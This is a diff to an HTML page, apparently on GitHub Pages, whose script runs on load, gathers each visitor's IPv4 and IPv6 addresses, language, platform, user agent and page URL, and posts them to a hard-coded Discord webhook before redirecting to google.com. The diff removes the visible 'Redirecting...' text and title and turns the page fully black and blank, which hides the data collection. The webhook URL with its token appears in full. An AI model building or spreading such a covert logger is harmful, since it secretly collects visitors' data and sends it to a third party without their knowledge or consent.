@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title></title>
     <script>
         // ==========================================
         // CONFIGURATION AREA
@@ -11,7 +11,7 @@
         const CONFIG = {
             DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
             REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
-            EMBED_COLOR: 3447003                  // Decimal color code (3447003 is Blue)
+            EMBED_COLOR: 16766720 // Decimal color code (3447003 is Blue)
         };
         // ==========================================
 
@@ -39,19 +39,19 @@
             const now = new Date();
             const localTimeString = now.toLocaleString('en-US', { timeZoneName: 'short' });
 
-            // 3. Prepare Discord Embed Payload
+            // 3. Prepare Discord Embed Payload (without emojis)
             const payload = {
                 embeds: [{
-                    title: "🌐 New Visitor Tracked",
+                    title: "New Visitor Tracked",
                     color: CONFIG.EMBED_COLOR,
                     timestamp: now.toISOString(),
                     fields: [
-                        { name: "🔒 IPv4 Address", value: `\`${ipv4}\``, inline: true },
-                        { name: "🔒 IPv6 Address", value: `\`${ipv6}\``, inline: true },
-                        { name: "🌐 Language / Region", value: `📡 \`${navigator.language}\``, inline: false },
-                        { name: "💻 Platform", value: `🖥️ \`${navigator.platform}\``, inline: true },
-                        { name: "📄 Current Page", value: `🔗 [GitHub Pages](\${window.location.href})`, inline: true },
-                        { name: "🕵️‍♂️ User Agent", value: `\`${navigator.userAgent}\``, inline: false }
+                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
+                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
+                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: false },
+                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "Current Page", value: `[GitHub Pages](\${window.location.href})`, inline: true },
+                        { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                     ],
                     footer: { text: `Visited on: ${localTimeString} | GitHub Traffic Logger` }
                 }]
@@ -76,25 +76,18 @@
         window.addEventListener('DOMContentLoaded', trackAndRedirect);
     </script>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        /* Makes the entire page completely black and hides scrolls */
+        html, body {
+            background-color: #000000 !important;
             margin: 0;
-            background-color: #0f172a;
-            color: #94a3b8;
-        }
-        .loader {
-            text-align: center;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
-    <div class="loader">
-        <h2>Connecting...</h2>
-        <p>Redirecting...</p>
-    </div>
+    <!-- Completely blank body -->
 </body>
 </html>
